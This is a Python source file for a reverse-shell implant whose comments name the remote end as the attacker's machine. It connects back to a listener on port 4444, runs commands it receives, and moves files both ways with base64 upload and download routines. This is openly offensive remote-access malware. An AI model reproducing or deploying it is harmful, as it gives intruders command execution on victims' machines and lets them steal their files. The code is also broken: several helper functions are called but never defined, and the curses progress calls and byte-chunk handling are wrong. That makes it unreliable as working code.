import socket
import subprocess
import os
import json
import base64
import curses

# Set up the target server and port (attacker's machine)
HOST = "127.0.0.1"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

def format_size(size_in_bytes):
    if size_in_bytes < 1024:
        return f"{size_in_bytes} B"
    elif size_in_bytes < 1024**2:
        return f"{size_in_bytes / 1024:.2f} KiB"
    elif size_in_bytes < 1024**3:
        return f"{size_in_bytes / 1024**2:.2f} MiB"
    else:
        return f"{size_in_bytes / 1024**3:.2f} GiB"

def print_progress(current, total, filename, curses_win):
    current_formatted = format_size(current)
    total_formatted = format_size(total)
    curses_win.addstr(f"[*] Uploaded {current_formatted} of {total_formatted} ({filename})\n")
    curses_win.refresh()

def write_file(path, content):
    total_size = len(content)
    current_size = 0

    with open(path, "wb") as file:
        for chunk in base64.b64decode(content):
            file.write(chunk)
            current_size += len(chunk)
            # Call curses to update live progress
            curses.wrapper(print_progress(current_size, total_size, path))

    return f"[*] Upload successful: {path} -> {path}"

def read_file(path):
    with open(path, "rb") as file:
        content = file.read()
        total_size = len(content)
        current_size = 0
        encoded = base64.b64encode(content)
        
        # Simulate live progress updates
        for chunk in encoded:
            current_size += len(chunk)
            curses.wrapper(print_progress(current_size, total_size, path))
        
        return encoded.decode()

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        # Send the current prompt to the server
        sock.sendall(current_prompt.encode("utf-8"))

        # Receive the command from the server
        command = sock.recv(1024).decode("utf-8").strip()

        # Handle the 'km' command to completely disconnect
        if command.lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        # Handle upload and download commands
        if command.startswith("upload"):
            try:
                _, filepath, file_content = receive_json(sock)
                print(f"[*] Uploading: {filepath} -> {filepath}")
                response = write_file(filepath, file_content)
                print(f"[*] Uploaded: {filepath} -> {filepath}")
            except Exception:
                response = "[+] Error during upload [+]"
            send_json(sock, response)
            continue

        if command.startswith("download"):
            try:
                _, filepath = receive_json(sock)
                print(f"[*] Downloading: {filepath} -> {filepath}")
                response = read_file(filepath)
                print(f"[*] Downloaded: {filepath} -> {filepath}")
            except Exception:
                response = "[+] Error during download [+]"
            send_json(sock, response)
            continue

        # Handle the 'shell' command to enter the shell mode
        if command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        # Handle the 'shell -d <directory>' command to set a specific directory
        if command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        # If in shell mode, process shell commands
        if in_shell_mode:
            if command.lower() == "exit":
                # Exit the shell and return to the default prompt
                in_shell_mode = False  # Disable shell mode
                current_prompt = default_prompt
                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
                continue

            # Execute the received shell command
            output = execute_command(command)
            sock.sendall(output.stdout + output.stderr)
            continue

        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))

except Exception as e:
    print(f"Error: {e}")
    sock.close()
